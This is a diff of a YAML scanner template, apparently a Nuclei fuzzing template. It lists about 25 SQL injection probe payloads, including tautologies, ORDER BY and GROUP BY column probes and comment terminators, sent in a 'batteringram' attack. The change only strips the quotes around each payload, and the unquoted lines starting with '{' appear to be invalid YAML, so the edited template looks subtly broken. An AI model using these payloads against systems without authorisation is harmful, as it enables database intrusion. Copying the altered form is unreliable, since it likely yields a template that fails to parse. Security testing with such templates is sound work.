@@ -20,31 +20,31 @@ requests:
         Connection: keep-alive
     payloads:
       sqli:
-         - "{{url_encode( 1 or 1)}}"
-         - "{{url_encode( %22%22|0;#)}}"
-         - "{{url_encode( '')}}"
-         - "{{url_encode( ' or#)}}"
-         - "{{url_encode( ' OR '1)}}"
-         - "{{url_encode( ' OR 1 -- -)}}"
-         - "{{url_encode( %22 OR 1 = 1 -- -#)}}"
-         - "{{url_encode( %22%22|0;#)}}"
-         - "{{url_encode( OR 1=1)}}"
-         - "{{url_encode( AND 1)}}"
-         - "{{url_encode( AND 0)}}"
-         - "{{url_encode( AND true)}}"
-         - "{{url_encode( AND false)}}"
-         - "{{url_encode( 1-false)}}"
-         - "{{url_encode( 1-true)}}"
-         - "{{url_encode( 1*56)}}"
-         - "{{url_encode( -2)}}"
-         - "{{url_encode( 1' ORDER BY 1--+)}}"
-         - "{{url_encode( 1' ORDER BY 2--+)}}"
-         - "{{url_encode( 1' ORDER BY 3--+)}}"
-         - "{{url_encode( 1' ORDER BY 1,2--+)}}"
-         - "{{url_encode( 1' ORDER BY 1,2,3--+)}}"
-         - "{{url_encode( 1' GROUP BY 1,2,--+)}}"
-         - "{{url_encode( 1' GROUP BY 1,2,3--+)}}"
-         - "{{url_encode( ' GROUP BY columnnames having 1=1 --)}}"
+         - {{url_encode( 1 or 1)}}
+         - {{url_encode( %22%22|0;#)}}
+         - {{url_encode( '')}}
+         - {{url_encode( ' or#)}}
+         - {{url_encode( ' OR '1)}}
+         - {{url_encode( ' OR 1 -- -)}}
+         - {{url_encode( %22 OR 1 = 1 -- -#)}}
+         - {{url_encode( %22%22|0;#)}}
+         - {{url_encode( OR 1=1)}}
+         - {{url_encode( AND 1)}}
+         - {{url_encode( AND 0)}}
+         - {{url_encode( AND true)}}
+         - {{url_encode( AND false)}}
+         - {{url_encode( 1-false)}}
+         - {{url_encode( 1-true)}}
+         - {{url_encode( 1*56)}}
+         - {{url_encode( -2)}}
+         - {{url_encode( 1' ORDER BY 1--+)}}
+         - {{url_encode( 1' ORDER BY 2--+)}}
+         - {{url_encode( 1' ORDER BY 3--+)}}
+         - {{url_encode( 1' ORDER BY 1,2--+)}}
+         - {{url_encode( 1' ORDER BY 1,2,3--+)}}
+         - {{url_encode( 1' GROUP BY 1,2,--+)}}
+         - {{url_encode( 1' GROUP BY 1,2,3--+)}}
+         - {{url_encode( ' GROUP BY columnnames having 1=1 --)}}
     attack: batteringram
 
     extractors:
